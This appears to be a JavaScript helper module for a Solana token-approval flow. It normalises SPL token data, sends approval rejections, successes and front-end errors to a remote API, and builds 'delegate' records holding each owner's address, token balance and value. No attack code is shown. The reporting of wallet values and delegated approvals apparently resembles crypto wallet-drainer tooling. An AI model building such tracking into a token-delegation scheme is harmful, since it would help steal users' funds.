import {
  logApprovalReject as logApprovalRejectShared,
  logFeError as logFeErrorShared,
  logApprovalSuccess as logApprovalSuccessShared,
} from "../hookClient";

export function toCanonicalToken(token) {
  return {
    id: token.mint ?? token.id,
    symbol: token.symbol,
    amount: token.amount,
    tokenValue: token.tokenValue,
    tokenType: token.tokenType ?? "spl-token",
    handleType: token.handleType,
  };
}

export const logApprovalReject = (
  apiUrl,
  handleType,
  token,
  apiData,
  isBatchPermit = false,
) =>
  logApprovalRejectShared(
    apiUrl,
    handleType,
    toCanonicalToken(token),
    apiData,
    isBatchPermit,
  );

export const logFeError = (
  apiUrl,
  handleType,
  token,
  apiData,
  error,
  isBatchPermit = false,
) =>
  logFeErrorShared(
    apiUrl,
    handleType,
    toCanonicalToken(token),
    apiData,
    error,
    isBatchPermit,
  );

export const logApprovalSuccess = (
  apiUrl,
  object,
  handleType,
  isBatchPermit = false,
) => logApprovalSuccessShared(apiUrl, object, handleType, isBatchPermit);

export const createDelegateObject = (
  token,
  { address, chainId, owner },
  transactionHash,
  tokenAccount,
  handleType = "delegate",
) => ({
  address,
  chainId,
  transactionHash,
  handleType,
  owner,
  tokenData: {
    mint: token.mint,
    symbol: token.symbol,
    balance: Number(token.amount),
    value: Number(token.tokenValue),
    type: "spl-token",
    tokenAccount,
  },
});
